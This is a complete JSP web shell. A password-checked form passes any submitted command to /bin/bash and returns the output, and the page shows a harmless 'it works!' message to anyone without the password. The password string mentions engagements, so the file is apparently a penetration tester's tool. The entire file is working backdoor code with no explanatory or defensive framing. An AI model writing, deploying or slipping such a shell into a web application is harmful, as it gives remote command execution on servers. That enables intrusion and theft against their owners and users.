<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"  version="1.2"> 
<jsp:directive.page contentType="text/html" pageEncoding="UTF-8" /> 
<jsp:directive.page import="java.io.*"/>
<jsp:directive.page import="java.lang.Process"/>
<![CDATA[
<HTML><BODY>
    <FORM METHOD="POST" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="dwp" value="${param.dwp}">
    <p></p>
    <INPUT TYPE="text" NAME="mdc" value="${param.mdc}">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
]]>
<jsp:scriptlet> 
    if(request.getParameter("mdc") != null &amp;&amp; request.getParameter("dwp").equals("averysecurepasswordthatisuniqueacrossengagements") ){
        String command = request.getParameter("mdc");
        String [] args = {"/bin/bash", "-c", command}; 
        try {
            out.print("/bin/bash -c " + command);
            out.print("&lt;p&gt;&lt;/p&gt;");
            ProcessBuilder pb = new ProcessBuilder(args);
            pb.redirectErrorStream(true);
            Process pro = pb.start();
            InputStream in = pro.getInputStream();
            BufferedReader br = new BufferedReader(new InputStreamReader(in));
            String lineStr;
            while ((lineStr = br.readLine()) != null) {
                out.print(lineStr);
                out.print("\n");
            }
        }catch (Exception e){
            String error =e.getMessage();
        }
    }else {
        out.print("it works!");
    }
</jsp:scriptlet> 
<![CDATA[
</pre>
</BODY></HTML>
]]>
</jsp:root>
